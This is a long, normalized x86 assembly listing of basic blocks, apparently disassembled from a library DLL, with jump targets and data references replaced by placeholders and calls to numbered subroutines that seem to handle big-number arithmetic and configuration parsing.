mov eax 0x1
pop ebx
retn
mov ebp [ esp + 0x20 ]
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x111
push r--data
push 0x6e
push 0x77
push 0x3
call sub_1001de60
add esp 0x14
cmp esi ebx
jle r-xdata
test esi esi
je r-xdata
mov esi ebx
push edi
push edi
call sub_10035d30
add esp 0x8
test eax eax
je r-xdata
push esi
push edi
push edi
call sub_10035e90
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
dec ebx
sub ebx esi
jmp r-xdata
test ebx ebx
jg r-xdata
push ebp
push edi
push edi
call sub_10038960
add esp 0xc
test eax eax
je r-xdata
push ebp
push edi
call sub_1002a000
add esp 0x8
test eax eax
jl r-xdata
push edi
call sub_10029870
push ebp
mov esi eax
call sub_10029870
mov [ esp + 0x1c ] esi
mov esi eax
mov eax [ esp + 0x1c ]
add esp 0x8
sub esi eax
js r-xdata
sub_10057d10
mov eax 0x64
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x7c ]
push edi
mov eax [ esi + 0x4 ]
test eax eax
jle r-xdata
test [ esi + 0x10 ] 0x4
mov eax [ esp + 0x84 ]
jne r-xdata
mov ecx [ esi ]
mov edx [ ecx + eax * 4 - 0x4 ]
test edx edx
jne r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
jne r-xdata
test [ eax + 0x10 ] 0x4
jne r-xdata
push 0xc3
push r--data
push 0x6b
push 0x6b
push 0x3
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x64
retn
mov edi [ esp + 0x88 ]
push edi
call sub_1002dd20
push edi
call sub_1002de70
push edi
mov [ esp + 0x20 ] eax
call sub_1002de70
mov esi eax
push edi
mov [ esp + 0x44 ] esi
call sub_1002de70
mov ebp eax
mov eax [ esp + 0x88 ]
add esp 0x10
mov [ esp + 0x20 ] ebp
test eax eax
jne r-xdata
push 0x1b6
push r--data
push 0x67
push 0x8a
push 0x3
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x64
retn
mov ecx [ eax + 0x4 ]
test ecx ecx
jne r-xdata
test ebp ebp
mov [ esp + 0x78 ] eax
je r-xdata
push edi
call sub_1002de70
add esp 0x4
push eax
push esi
call sub_10029fb0
add esp 0x8
test eax eax
jge r-xdata
push 0xd5
push r--data
push 0x67
push 0x6b
push 0x3
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x64
retn
mov ecx [ esp + 0x88 ]
push ecx
call sub_1002de00
add esp 0x4
test eax eax
je r-xdata
mov edi [ esp + 0x88 ]
push edi
call sub_1002dd20
push edi
call sub_1002de70
push edi
mov [ esp + 0x28 ] eax
call sub_1002de70
mov esi eax
push edi
mov [ esp + 0x38 ] esi
call sub_1002de70
mov ebx [ esp + 0x88 ]
add esp 0x10
mov ebp eax
test ebx ebx
mov [ esp + 0x10 ] ebp
jne r-xdata
mov eax [ esp + 0x7c ]
test eax eax
je r-xdata
mov ebx [ esp + 0x84 ]
push ebx
call sub_10029870
and eax 0x8000001f
jns r-xdata
test ebp ebp
je r-xdata
push edi
call sub_1002de70
add esp 0x4
mov ebx eax
mov eax [ esp + 0x78 ]
test eax eax
je r-xdata
push esi
push eax
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov edi 0x20
sub edi eax
push edi
push ebx
push ebp
call sub_10035e90
add esp 0x10
test eax eax
je r-xdata
dec eax
or eax 0xffffffe0
inc eax
mov eax [ esp + 0x88 ]
push eax
call sub_1002de00
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x64
retn
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x64
retn
push 0x0
push eax
call sub_10029cf0
add esp 0x8
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x64
retn
mov ecx [ esp + 0x80 ]
add edi 0x20
push edi
xor ebx ebx
push ecx
push esi
mov [ ebp + 0xc ] ebx
mov [ esp + 0x48 ] edi
call sub_10035e90
add esp 0xc
test eax eax
je r-xdata
mov edx [ esp + 0x84 ]
push edx
call sub_10029870
and eax 0x8000001f
jns r-xdata
mov ecx [ esi + 0x4 ]
mov [ esi + 0xc ] ebx
mov eax [ ebp + 0x4 ]
lea edx [ eax + 0x1 ]
cmp ecx edx
jg r-xdata
mov edi 0x20
sub edi eax
mov eax [ esp + 0x88 ]
push edi
push eax
push ebp
call sub_10035e90
add esp 0x10
test eax eax
je r-xdata
dec eax
or eax 0xffffffe0
inc eax
lea eax [ ecx + 0x1 ]
mov ecx [ esi + 0x8 ]
cmp eax ecx
jg r-xdata
mov ecx [ esi + 0x8 ]
add eax 0x2
cmp eax ecx
jg r-xdata
mov ecx [ esp + 0x80 ]
add edi 0x20
push edi
push ecx
push esi
mov [ ebp + 0xc ] 0x0
mov [ esp + 0x38 ] edi
call sub_10035e90
add esp 0xc
test eax eax
je r-xdata
push eax
push esi
call sub_10029af0
add esp 0x8
mov eax esi
jmp r-xdata
push eax
push esi
call sub_10029af0
add esp 0x8
mov eax esi
jmp r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esi + 0x4 ]
xor ecx ecx
mov ebp eax
mov [ esi + 0xc ] ecx
mov edi [ edx + 0x4 ]
sub ebp edi
mov [ esp + 0x58 ] ecx
mov edx [ esi ]
mov [ esp + 0x50 ] edi
lea ecx [ ebp * 4 ]
mov [ esp + 0x24 ] edi
add edx ecx
mov [ esp + 0x4c ] edx
mov ecx [ esi + 0x8 ]
mov edx [ esp + 0x10 ]
sub ecx ebp
mov [ esp + 0x54 ] ecx
cmp edi 0x1
mov ecx [ edx ]
mov edx [ ecx + edi * 4 - 0x4 ]
mov [ esp + 0x14 ] edx
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
mov [ ecx + eax * 4 ] ebx
mov eax [ esi + 0x4 ]
inc eax
mov [ esi + 0x4 ] eax
cmp eax ebx
je r-xdata
mov ecx [ ebp + 0x4 ]
mov eax [ esi + 0x4 ]
add ecx 0x2
cmp eax ecx
jge r-xdata
cmp eax ebx
je r-xdata
mov ecx [ ecx + edi * 4 - 0x8 ]
mov [ esp + 0x18 ] ecx
mov [ esp + 0x18 ] 0x0
jmp r-xdata
mov edx [ ebp + ebx * 4 - 0x8 ]
mov [ esp + 0x18 ] edx
mov [ esp + 0x18 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x4 ]
add edx 0x2
mov [ esi + 0x4 ] edx
jmp r-xdata
mov edx [ esi ]
inc eax
mov [ edx + eax * 4 - 0x4 ] ebx
mov ecx [ ebp + 0x4 ]
add ecx 0x2
cmp eax ecx
jl r-xdata
push eax
push ebx
call sub_10029af0
add esp 0x8
mov eax ebx
jmp r-xdata
mov edx [ esi ]
mov ecx [ esp + 0x84 ]
lea eax [ edx + eax * 4 - 0x4 ]
mov edx [ ecx + 0xc ]
mov [ esp + 0x78 ] eax
mov eax [ esp + 0x80 ]
mov ecx [ eax + 0xc ]
lea eax [ ebp + 0x1 ]
xor edx ecx
mov ecx [ ebx + 0x8 ]
cmp eax ecx
mov [ ebx + 0xc ] edx
jg r-xdata
mov ecx [ esp + 0x78 ]
push eax
push ecx
call sub_10029af0
add esp 0x8
mov eax ecx
jmp r-xdata
lea ebp [ ecx + eax * 4 - 0x4 ]
mov eax [ esp + 0x84 ]
mov [ esp + 0x10 ] ebp
mov edx [ eax + 0xc ]
mov eax [ esp + 0x80 ]
mov ecx [ eax + 0xc ]
lea eax [ edi + 0x1 ]
xor edx ecx
mov ecx [ esp + 0x78 ]
mov [ ecx + 0xc ] edx
mov edx [ ecx + 0x8 ]
cmp eax edx
jg r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ ebp + 0x4 ]
mov ecx [ esi ]
mov ebp [ ebp ]
mov edi eax
mov [ esp + 0x28 ] ebx
sub edi ebx
cmp ebx 0x1
lea edx [ ecx + edi * 4 ]
mov [ esp + 0x60 ] edx
mov edx [ ebp + ebx * 4 - 0x4 ]
mov [ esp + 0x1c ] edx
jne r-xdata
mov ecx [ ebx ]
mov [ ebx + 0x4 ] ebp
lea eax [ edi + 0x1 ]
lea edx [ ecx + ebp * 4 - 0x4 ]
mov ecx [ esp + 0x1c ]
mov [ esp + 0x84 ] edx
cmp eax [ ecx + 0x8 ]
jg r-xdata
test eax eax
je r-xdata
mov eax [ esp + 0x78 ]
lea ecx [ edi - 0x1 ]
inc ebx
mov [ esp + 0x2c ] ecx
mov edx [ eax ]
mov [ eax + 0x4 ] ecx
lea eax [ edx + edi * 4 - 0x4 ]
mov [ esp + 0x84 ] eax
mov eax [ esp + 0x14 ]
cmp ebx [ eax + 0x8 ]
jle r-xdata
test eax eax
je r-xdata
push eax
mov eax [ esp + 0x20 ]
push eax
call sub_10029af0
add esp 0x8
mov eax ecx
jmp r-xdata
test eax eax
je r-xdata
mov ecx eax
push ebx
push ecx
call sub_10029af0
mov ecx [ esp + 0x34 ]
add esp 0x8
mov ecx [ esp + 0x10 ]
lea edx [ esp + 0x4c ]
push ecx
push edx
call sub_10029fb0
add esp 0x8
test eax eax
jl r-xdata
test eax eax
je r-xdata
mov eax [ esp + 0x78 ]
mov edx [ eax + 0x4 ]
test edx edx
jne r-xdata
dec [ ebx + 0x4 ]
mov eax [ esp + 0x10 ]
push edi
mov ecx [ eax ]
mov eax [ esp + 0x50 ]
push ecx
push eax
push eax
call sub_100537d0
mov edx [ esp + 0x94 ]
add esp 0x10
mov [ edx ] 0x1
jmp r-xdata
sub [ esp + 0x84 ] 0x4
mov [ eax + 0xc ] 0x0
jmp r-xdata
sub [ esp + 0x84 ] 0x4
mov [ ebx + 0xc ] 0x0
jmp r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jle r-xdata
mov [ esp + 0x24 ] ecx
test ecx ecx
jle r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jle r-xdata
mov ecx [ esp + 0x78 ]
mov [ esp + 0x20 ] ebp
dec ebp
test ebp ebp
jle r-xdata
mov edi [ esp + 0x7c ]
test edi edi
je r-xdata
mov edx [ esi ]
lea eax [ edx + eax * 4 - 0x4 ]
mov edi [ esp + 0x1c ]
xor ecx ecx
xor edx edx
or eax ecx
push ecx
or edx esi
push edi
push eax
push edx
call sub_1006af10
mov ebp eax
mov eax [ esp + 0x18 ]
mov edx ebp
xor ebx ebx
imul edx edi
push ebx
push eax
push ebx
push ebp
sub esi edx
call sub_1001d090
mov ecx [ esp + 0x10 ]
mov [ esp + 0x2c ] eax
xor edi edi
mov eax [ ecx - 0x8 ]
mov ecx esi
mov [ esp + 0x44 ] eax
or edi eax
xor eax eax
or ecx eax
cmp edx ecx
jb r-xdata
or ebp 0xffffffff
jmp r-xdata
mov edi [ esp + 0x7c ]
test edi edi
je r-xdata
mov ecx [ esi ]
lea eax [ ecx + eax * 4 - 0x4 ]
mov edi [ esp + 0x14 ]
xor edx edx
xor ecx ecx
or eax edx
push edx
or ecx esi
push edi
push eax
push ecx
call sub_1006af10
mov ecx [ esp + 0x18 ]
mov ebp eax
imul eax edi
xor ebx ebx
sub esi eax
push ebx
push ecx
push ebx
push ebp
call sub_1001d090
mov [ esp + 0x3c ] eax
mov eax [ esp + 0x78 ]
xor edi edi
mov ecx esi
mov eax [ eax - 0x8 ]
mov [ esp + 0x34 ] eax
or edi eax
xor eax eax
or ecx eax
cmp edx ecx
jb r-xdata
or ebp 0xffffffff
jmp r-xdata
mov eax [ esp + 0x78 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
jle r-xdata
mov eax [ esp + 0x3c ]
mov edx [ esp + 0x80 ]
push eax
push esi
mov ebx [ edx + 0xc ]
push edi
call sub_10035fd0
mov eax [ edi + 0x4 ]
add esp 0xc
test eax eax
je r-xdata
mov edx [ esi + 0x4 ]
dec edx
mov ecx edx
mov [ esi + 0x4 ] edx
test ecx ecx
jg r-xdata
mov ecx [ esp + 0x20 ]
mov ebx [ esp + 0x14 ]
mov edi [ esp + 0x28 ]
push ebp
mov edx [ ecx ]
mov eax [ ebx ]
push edi
push edx
push eax
call sub_10053470
mov ecx [ ebx ]
mov esi [ esp + 0x70 ]
sub esi 0x4
mov [ ecx + edi * 4 ] eax
mov edx [ ebx ]
lea eax [ edi + 0x1 ]
mov [ esp + 0x70 ] esi
push eax
push edx
push esi
push esi
call sub_100537d0
add esp 0x20
test eax eax
je r-xdata
ja r-xdata
mov edx [ esp + 0x88 ]
push edx
call sub_1002de00
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x64
retn
mov ecx [ esp + 0x2c ]
mov eax [ esp + 0x80 ]
push ecx
push esi
mov ebx [ eax + 0xc ]
push edi
call sub_10035fd0
mov eax [ edi + 0x4 ]
add esp 0xc
test eax eax
je r-xdata
mov edx [ esi + 0x4 ]
dec edx
mov ecx edx
mov [ esi + 0x4 ] edx
test ecx ecx
jg r-xdata
mov ebx [ esp + 0x10 ]
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x24 ]
push ebp
mov edx [ ebx ]
mov eax [ edi ]
push esi
push edx
push eax
call sub_10053470
mov ecx [ edi ]
mov [ ecx + esi * 4 ] eax
mov eax [ esp + 0x5c ]
sub eax 0x4
lea ecx [ esi + 0x1 ]
mov [ esp + 0x5c ] eax
mov edx [ edi ]
push ecx
push edx
push eax
push eax
call sub_100537d0
add esp 0x20
test eax eax
je r-xdata
ja r-xdata
mov eax [ esp + 0x88 ]
push eax
call sub_1002de00
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x64
retn
mov edx [ eax ]
lea ecx [ edx + ecx * 4 - 0x4 ]
mov [ edi + 0xc ] ebx
mov ecx [ eax ]
sub eax 0x4
test ecx ecx
jne r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x20 ]
push edi
dec ebp
mov ecx [ eax ]
push ecx
push esi
push esi
call sub_100536c0
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
dec ebp
add esi eax
cmp esi eax
jb r-xdata
cmp [ esp + 0x2c ] edi
jbe r-xdata
mov [ edi + 0xc ] ebx
mov edx [ eax ]
sub eax 0x4
test edx edx
jne r-xdata
mov ecx [ esp + 0x78 ]
mov eax [ ebx ]
push esi
push eax
mov eax [ esp + 0x54 ]
push eax
push eax
dec ebp
call sub_100536c0
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
dec ebp
add esi eax
cmp esi eax
jb r-xdata
cmp [ esp + 0x3c ] edi
jbe r-xdata
mov esi [ eax + 0x4 ]
dec esi
mov edx esi
mov [ eax + 0x4 ] esi
test edx edx
jg r-xdata
mov eax [ ebp ]
mov ecx [ esp + 0x1c ]
mov esi [ ebp - 0x4 ]
cmp eax ecx
jne r-xdata
mov esi [ esp + 0x34 ]
mov ecx [ esp + 0x10 ]
inc [ ecx ]
jmp r-xdata
mov eax [ esp + 0x18 ]
mov edi [ esp + 0x2c ]
sub edi eax
mov eax [ esp + 0x44 ]
mov [ esp + 0x2c ] edi
mov ecx esi
sbb edx ebx
xor edi edi
or edi eax
xor eax eax
or ecx eax
cmp edx ecx
ja r-xdata
mov eax [ ecx ]
mov esi [ ecx - 0x4 ]
cmp eax [ esp + 0x14 ]
jne r-xdata
mov esi [ esp + 0x28 ]
mov ecx [ esp + 0x78 ]
inc [ ecx ]
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov edi [ esp + 0x3c ]
mov eax [ esp + 0x34 ]
sub edi ecx
mov [ esp + 0x3c ] edi
mov ecx esi
sbb edx ebx
xor edi edi
or edi eax
xor eax eax
or ecx eax
cmp edx ecx
ja r-xdata
mov edx [ ecx ]
sub ecx 0x4
test edx edx
jne r-xdata
mov eax [ esp + 0x84 ]
mov [ eax ] ebp
sub eax 0x4
mov [ esp + 0x84 ] eax
mov eax [ esp + 0x24 ]
lea ebp [ ecx - 0x4 ]
dec eax
mov [ esp + 0x10 ] ebp
mov [ esp + 0x24 ] eax
jne r-xdata
jb r-xdata
mov eax [ esp + 0x84 ]
add ecx 0xfffffffc
mov [ esp + 0x78 ] ecx
mov [ eax ] ebp
sub eax 0x4
mov [ esp + 0x84 ] eax
mov eax [ esp + 0x20 ]
dec eax
mov [ esp + 0x20 ] eax
jne r-xdata
jb r-xdata
cmp [ esp + 0x2c ] edi
ja r-xdata
cmp [ esp + 0x3c ] edi
ja r-xdata
sub_100585f0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
push edx
push eax
push r--data
push sub_10022890
call sub_1004add0
add esp 0x18
retn
sub_10058620
push 0x45
push r--data
push 0x2c
call sub_1001d4c0
xor ecx ecx
add esp 0xc
cmp eax ecx
jne r-xdata
mov [ eax + 0xc ] ecx
mov [ eax + 0x20 ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x28 ] 0x1
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
retn
push 0x48
push r--data
push 0x41
push 0xaa
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
retn
sub_10058670
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push 0x5d
push r--data
push 0x4
lea eax [ esi + 0x28 ]
push 0xffffffff
push eax
call sub_1001f5f0
add esp 0x14
test eax eax
jg r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call sub_10022870
add esp 0x4
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call sub_100350a0
add esp 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
push eax
call sub_10061280
add esp 0x4
push esi
call sub_1001d740
add esp 0x4
push eax
call sub_1001d740
add esp 0x4
sub_100586e0
mov eax 0x34
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x4c ]
xor esi esi
cmp edi esi
mov [ esp + 0x10 ] esi
mov [ esp + 0x18 ] esi
mov [ esp + 0x1c ] esi
mov [ esp + 0x28 ] esi
jne r-xdata
mov [ esp + 0x14 ] edi
call sub_1001e3c0
mov edi eax
cmp edi esi
mov [ esp + 0x14 ] edi
jne r-xdata
push edi
xor esi esi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
lea eax [ esp + 0x24 ]
lea ecx [ esp + 0x1c ]
push eax
lea edx [ esp + 0x1c ]
push ecx
mov ecx [ esp + 0x50 ]
lea eax [ esp + 0x18 ]
push edx
push eax
push ecx
mov [ esp + 0x34 ] esi
call sub_1004b930
add esp 0x14
test eax eax
je r-xdata
call sub_10058620
mov ebx eax
cmp ebx esi
je r-xdata
push 0x6c
push r--data
push 0x41
push 0x74
push 0x9
call sub_1001de60
add esp 0x14
jmp r-xdata
cmp edi [ esp + 0x4c ]
je r-xdata
push esi
push edi
call sub_1001e7c0
push eax
call sub_10058670
push edi
inc esi
call sub_1001e7b0
add esp 0x10
cmp esi eax
jl r-xdata
call sub_1001e020
and eax 0xfff
cmp eax 0x6c
jne r-xdata
mov edi [ esp + 0x10 ]
mov esi r--data
mov eax edi
xor esi esi
jmp r-xdata
push edi
call sub_1001e780
add esp 0x4
test ebx ebx
je r-xdata
call sub_1001df60
cmp [ ebx ] 0x0
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax [ esp + 0x28 ]
test eax eax
jne r-xdata
push ebx
call sub_10058670
add esp 0x4
push ebx
push edi
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
jne r-xdata
mov eax [ ebx ]
mov ebp sub_10022820
test eax eax
je r-xdata
mov esi r--data
mov eax edi
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
push eax
call sub_1001d740
add esp 0x4
mov esi [ esp + 0x14 ]
mov edi [ esp + 0x14 ]
xor ebx ebx
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
mov esi ebx
jmp r-xdata
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
push eax
call sub_1001d740
add esp 0x4
mov eax [ ebx + 0x24 ]
test eax eax
je r-xdata
test ebp ebp
je r-xdata
mov edi [ esp + 0x14 ]
push ebx
push edi
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
mov esi r--data
mov eax edi
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x34
retn
push eax
call sub_1001d740
add esp 0x4
mov [ esp + 0x28 ] 0x1
jmp r-xdata
xor esi esi
cmp edi esi
je r-xdata
mov eax [ esp + 0x20 ]
test eax eax
jne r-xdata
call sub_10058620
mov ebx eax
test ebx ebx
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov eax [ esp + 0x18 ]
cmp eax esi
je r-xdata
push edi
call sub_1001d740
add esp 0x4
mov edx [ esp + 0x18 ]
lea ecx [ ebx + 0xc ]
push ecx
push edx
call sub_1004b700
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x18 ]
lea eax [ esp + 0x30 ]
push eax
push ecx
call sub_1004b700
add esp 0x8
test eax eax
je r-xdata
jmp r-xdata
mov esi r--data
mov eax edi
mov eax [ ebx ]
mov ebp sub_10022890
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov eax [ esp + 0x1c ]
cmp eax esi
je r-xdata
push eax
call sub_1001d740
add esp 0x4
mov eax [ esp + 0x1c ]
mov [ ebx + 0x24 ] eax
mov ecx [ esp + 0x24 ]
mov [ ebx + 0x20 ] ecx
mov [ esp + 0x1c ] 0x0
mov edx [ esp + 0x54 ]
mov eax [ esp + 0x50 ]
push edx
mov edx [ esp + 0x20 ]
lea ecx [ esp + 0x28 ]
push eax
push ecx
lea eax [ esp + 0x3c ]
push edx
push eax
call sub_1004b4b0
add esp 0x14
test eax eax
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
jmp r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
lea edx [ esp + 0x24 ]
lea eax [ esp + 0x1c ]
push edx
lea ecx [ esp + 0x1c ]
push eax
mov eax [ esp + 0x50 ]
lea edx [ esp + 0x18 ]
push ecx
push edx
push eax
mov [ esp + 0x24 ] esi
mov [ esp + 0x2c ] esi
mov [ esp + 0x30 ] esi
mov [ esp + 0x34 ] esi
call sub_1004b930
add esp 0x14
test eax eax
jne r-xdata
push eax
call sub_1001d740
add esp 0x4
mov edx [ esp + 0x24 ]
mov ecx [ esp + 0x1c ]
lea eax [ esp + 0x2c ]
push edx
push eax
push esi
mov [ esp + 0x38 ] ecx
call ebp
add esp 0xc
test eax eax
je r-xdata
mov esi r--data
mov eax edi
mov eax [ ebx + 0x4 ]
mov ebp sub_10035080
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov edi [ esp + 0x14 ]
push 0x100
push r--data
push 0xd
push 0x74
push 0x9
call sub_1001de60
add esp 0x14
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
lea esi [ ebx + 0x4 ]
jmp r-xdata
jmp r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov edi [ esp + 0x10 ]
mov esi r--data
mov eax edi
mov eax [ ebx + 0x8 ]
mov ebp sub_1002b480
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov [ ebx + 0x24 ] 0x0
mov [ ebx + 0x20 ] 0x0
call sub_100611f0
mov [ ebx + 0x8 ] eax
call sub_10023850
mov ecx [ ebx + 0x8 ]
mov [ ecx + 0xc ] eax
mov edx [ ebx + 0x8 ]
mov eax [ edx + 0xc ]
test eax eax
je r-xdata
jmp r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi r--data
mov eax edi
mov eax [ ebx + 0x8 ]
mov ebp sub_1002e4b0
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov eax edx
mov ecx [ eax + 0xc ]
xor eax eax
mov [ ecx ] 0x6
mov edx [ ebx + 0x8 ]
mov edi [ esp + 0x18 ]
or ecx 0xffffffff
mov esi [ edx + 0xc ]
add esi 0xc
[ edi ]
not ecx
dec ecx
cmp ecx 0xa
jle r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov [ ebx + 0x24 ] 0x0
mov [ ebx + 0x20 ] 0x0
call sub_100611f0
mov [ ebx + 0x8 ] eax
call sub_10023850
mov ecx [ ebx + 0x8 ]
mov [ ecx + 0xc ] eax
mov edx [ ebx + 0x8 ]
mov eax [ edx + 0xc ]
test eax eax
je r-xdata
jmp r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov edi [ esp + 0x10 ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov ebp sub_1004fd40
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov eax edx
mov ecx [ eax + 0xc ]
mov [ ecx ] 0x74
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov [ esp + 0x20 ] 0x1
mov [ ebx + 0x24 ] 0x0
mov [ ebx + 0x20 ] 0x0
call sub_100611f0
mov [ ebx + 0x8 ] eax
call sub_10023850
mov ecx [ ebx + 0x8 ]
mov [ ecx + 0xc ] eax
mov edx [ ebx + 0x8 ]
mov eax [ edx + 0xc ]
test eax eax
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov eax edx
mov ecx [ eax + 0xc ]
mov [ ecx ] 0x198
jmp r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov edx [ ebx + 0x8 ]
mov edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
mov esi [ edx + 0xc ]
add esi 0xc
[ edi ]
not ecx
dec ecx
cmp ecx 0xa
jle r-xdata
sub_10058cb0
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
test ebx ebx
push edi
jne r-xdata
mov esi [ esp + 0x1c ]
cmp esi 0x3
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov edi [ ebx ]
push esi
push edi
push 0x0
call sub_1002eb00
mov ebp [ esp + 0x24 ]
add esp 0xc
test ebp ebp
mov [ esp + 0x1c ] eax
je r-xdata
mov eax [ esp + 0x18 ]
push eax
push ebx
call sub_1002ef10
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
retn
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ ebp ]
cmp esi 0x10
mov [ esp + 0x14 ] ecx
je r-xdata
mov eax 0x1
cmp esi 0x11
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ esp + 0x20 ]
push edx
push esi
push edi
push eax
lea eax [ esp + 0x24 ]
push eax
call sub_1002ea00
mov ecx [ ebx ]
mov esi [ ebx + 0x8 ]
mov edi [ esp + 0x28 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
add esp 0x14
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x14 ]
mov ecx [ ebx ]
add eax ecx
mov [ ebp ] eax
mov eax [ esp + 0x1c ]
sub_10058d60
mov eax [ esp + 0x4 ]
push eax
call gmtime
add esp 0x4
test eax eax
jne r-xdata
push esi
mov esi eax
mov eax [ esp + 0xc ]
push edi
mov ecx 0x9
mov edi eax
[ edi ] [ esi ]
pop edi
pop esi
retn
retn
sub_10058da0
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx ]
mov ecx [ esp + 0x4 ]
mov eax [ edx + 0x4 ]
mov edx [ ecx ]
push eax
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
push ecx
call sub_10030b10
add esp 0x8
retn
sub_10058dd0
mov eax 0x1c
call sub_1001d0d0
mov eax [ esp + 0x24 ]
push esi
mov esi [ esp + 0x24 ]
lea edx [ esp + 0x4 ]
lea ecx [ esp + 0x10 ]
push edx
